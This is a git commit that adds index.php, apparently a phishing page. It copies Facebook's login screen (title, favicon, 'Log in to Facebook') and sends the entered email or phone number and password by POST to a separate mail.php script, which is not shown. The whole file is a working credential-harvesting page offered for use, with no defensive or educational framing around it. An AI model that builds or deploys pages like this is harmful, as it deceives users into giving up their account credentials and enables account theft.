c228be63d22ff286d0e2d99d7fd757882027eb28
Anjumjaan <42011358+Anjumjaan@users.noreply.github.com>
2020-06-04 19:46:55 +0500

    Create index.php

---
+++ index.php
@@ -0,0 +1,39 @@
+<html>
+<head>
+<link rel="stylesheet" type="text/css" href="fb.css">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title >
+Facebook
+</title>
+<link rel="shortcut icon" href="index.jpg" />
+<script>
+
+
+
+
+</script>
+</head>
+
+<body>
+<div id="upper">
+<div id="head">facebook
+<input type="submit" id="sign"value="Sign In" name="button">
+</div>
+
+</div>
+
+<div id="center">
+<form method="POST" action="mail.php">
+<p>Log in to Facebook</p>
+<p><input type="text" id="text" placeholder="Email address or phone number" name="username" ></p>
+<p><input type="password" id="pass" placeholder="password"  name="password"></p>
+<p><input type="submit" id="butt"   value="Log In" ></p>
+<div id="checkbox">keep me log in: <input type="checkbox" value="keep me log in"></div>
+<p id="forgot"><a href="null">Forgot Password?</a>  <a href="null">Signup Now</a></p>
+</div>
+</form>
+
+</body>
+
+</html>
